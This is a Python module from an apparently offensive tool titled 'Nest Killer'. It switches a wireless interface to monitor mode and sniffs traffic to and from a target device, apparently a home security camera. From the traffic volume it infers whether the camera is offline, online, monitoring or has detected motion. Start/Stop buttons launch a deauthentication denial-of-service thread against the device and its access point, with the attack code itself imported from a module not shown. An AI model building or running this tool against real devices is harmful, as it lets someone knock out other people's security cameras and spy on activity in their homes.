#!/usr/bin/python3

"""This module contains multiple tools to analyze a device."""
from .interface_manager import InterfaceManager
from .denial_of_service import DenialOfService
import numpy as np
import threading
from matplotlib.animation import FuncAnimation
import matplotlib.pyplot as plt
from matplotlib.widgets import Button


class DeviceAnalyzer():
    """Analyze a device."""

    def __init__(self, device, ap, interface, timeout=3):
        """Initialize variables."""
        self.device = device
        self.ap = ap
        self.interface = interface
        self.timeout = timeout
        self.channels = [1, 6, 11]

        self.manager = InterfaceManager(interface)
        self.manager.wlan_mode(InterfaceManager.MONITOR_MODE)

    def get_channels(self):
        """Returns most active channels by counting packets from/to target."""
        print(f'[INFO]',
              f'Analyzing channels...',
              f'[device: {self.device}, interface: {self.interface}]')
        self.counters = {i: 0 for i in self.channels}
        # set to monitor mode
        self.manager.wlan_mode(InterfaceManager.MONITOR_MODE)
        # for each channel
        for ch in self.channels:
            # set interface to correct channel
            self.manager.wlan_channel(ch)
            # sniff on the interface
            capture = self.manager.capture(
                bpf_filter=f'wlan addr2 {self.device} or \
                             wlan addr1 {self.device}',
                timeout=self.timeout)
            # count the number of packets
            self.counters[ch] = len(capture)
            if (self.counters[ch] > 0):
                print(f'[INFO]',
                      f'Channel {ch}: {self.counters[ch]} packets')
        # set to managed mode
        self.manager.wlan_mode(InterfaceManager.MANAGED_MODE)
        # return the channel with the most counted packets
        return max(self.counters, key=self.counters.get)

    def visualize_packets(self, channel=6, interval=1, length=120):
        """Visualize packets by counting packets from/to target."""
        print(f'[INFO]',
              f'Visualizing packets...',
              f'[channel {channel}, interval: {interval}, length: {length}]')
        # set to monitor mode
        self.manager.wlan_mode(InterfaceManager.MONITOR_MODE)
        # set all variables
        self.dos_callback = DenialOfService(self.interface, channel)
        plt.style.use('dark_background')
        plt.rcParams['toolbar'] = 'None'
        plt.rcParams['font.family'] = 'monospace'
        self.manager.wlan_channel(channel)
        self.interval = interval
        self.length = length
        self.counters = {'transmitting': 0, 'receiving': 0, 'average': 0}
        self.x = (np.arange(-self.length/self.interval, 0, dtype=np.float))
        self.y = {i: [0]*int(self.length/self.interval) for i in self.counters}
        self.fig = plt.figure(figsize=(10, 4))
        colors = {'transmitting': '#8fde99', 'receiving': '#d4de8f', 'average': '#ff3232'}
        self.lines = {i: plt.plot([], [], color=colors[i], label=f'{i}')[0]
                      for i in self.counters}

        self.ax = plt.gca()

        # setup graph
        self.ax.set_xlim(self.x[0], self.x[-1])
        self.ax.set_xticks(np.arange(self.x[0], 1, step=10 / self.interval))
        self.ax.set_xticklabels(np.arange(int(self.x[0] * self.interval), 1, step=10))
        self.ax.set_xlabel('time [s]')
        self.ax.set_ylim(0, 80000 * self.interval)
        self.ax.set_ylabel(f'payload [bytes in {self.interval}s]')
        self.ax.set_title(f'--- Nest Killer ---', loc='center')
        self.ax.text(0.01, 0.80, f'Device: {self.device}', ha='left', va='center', transform=self.ax.transAxes)
        self.ax.text(0.01, 0.78, f'AP: {self.ap}', ha='left', va='center', transform=self.ax.transAxes)
        self.cur_text = self.ax.text(0.01, 0.74, f' ', ha='left', va='center', transform=self.ax.transAxes)
        self.avg_text = self.ax.text(0.01, 0.72, f' ', ha='left', va='center', transform=self.ax.transAxes)
        self.sta_text = self.ax.text(0.01, 0.68, f' ', ha='left', va='center', transform=self.ax.transAxes)
        self.dos_text = self.ax.text(0.01, 0.66, f' ', ha='left', va='center', transform=self.ax.transAxes)
        self.ax.legend(loc='upper left')

        axstart = plt.axes([0.1, 0.01, 0.1, 0.05])
        axstop = plt.axes([0.2, 0.01, 0.1, 0.05])
        bstart = Button(axstart, 'Start')
        bstart.color = '#4c4c4c'
        bstart.hovercolor = '#666666'
        bstart.on_clicked(self.dos_callback.start)
        bstop = Button(axstop, 'Stop')
        bstop.color = '#191919'
        bstop.hovercolor = '#323232'
        bstop.on_clicked(self.dos_callback.stop)

        # thread animating graph
        animation = FuncAnimation(
            self.fig,
            self._update(),
            interval=int(1000.0 * self.interval)
        )

        # thread capturing packets
        threading.Thread(target=self._capture, daemon=True).start()

        # thread for deauth attack
        threading.Thread(target=self.dos_callback.init_deauth(self.device, self.ap),
                         daemon=True).start()

        plt.show(block=True)

    def _capture(self):
        capture = self.manager.capture(
                bpf_filter=f'wlan addr2 {self.device} or \
                             wlan addr1 {self.device}')
        for packet in capture:
            try:
                if packet.wlan.ta == self.device and \
                   packet.wlan.fc_type == '2':
                    self.counters['transmitting'] += len(packet)
                if packet.wlan.ra == self.device and \
                   packet.wlan.fc_type == '2':
                    self.counters['receiving'] += len(packet)
            except AttributeError:
                continue

    def _update(self):
        def __(_):
            for i in self.counters:
                if i == 'average':
                    self.y[i].append(np.mean(
                        self.y['transmitting'][-5*int(1/self.interval):]))
                else:
                    self.y[i].append(self.counters[i])
                self.y[i] = self.y[i][-int(self.length/self.interval):]
                self.lines[i].set_data([self.x[-len(self.y[i]):], self.y[i]])
                self.counters[i] = 0
            avg = self.y['average'][-1]
            cur = self.y['transmitting'][-1]
            self.cur_text.set_text(f'cur: {cur:.0f}')
            self.avg_text.set_text(f'avg: {avg:.0f}')
            self.sta_text.set_text(f'status: {self._get_status(avg)}')
            self.dos_text.set_text(f'DoS: {self.dos_callback.sending}')
            return self.lines.values()
        return __

    def _get_status(self, q):
        if q > 4000:
            return "monitoring"
        elif q > 800:
            return "motion detected"
        elif q > 0:
            return "online"
        else:
            return "offline"
